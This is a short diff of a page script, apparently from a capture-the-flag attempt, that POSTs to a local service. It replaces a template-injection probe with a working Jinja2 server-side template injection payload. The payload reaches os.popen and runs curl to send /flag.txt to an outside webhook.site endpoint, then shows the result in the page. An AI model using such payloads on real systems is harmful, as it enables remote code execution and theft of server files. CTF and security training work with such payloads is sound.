@@ -4,7 +4,7 @@
   fetch("http://127.0.0.1:4000/", {
     method: "POST",
     headers: {"Content-Type":"application/x-www-form-urlencoded"},
-    body: `comment={{"".__class__.__base__.subclasses()}}`
+    body: `comment={{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl -X POST -H "Content-Type: text/plain" --data-binary @/flag.txt https://webhook.site/2522fcfa-1d40-4082-a36d-02aa8457b5bc').read() }}`
   }).then(r => r.text())
     .then(t => document.body.innerHTML = t);
 </script>
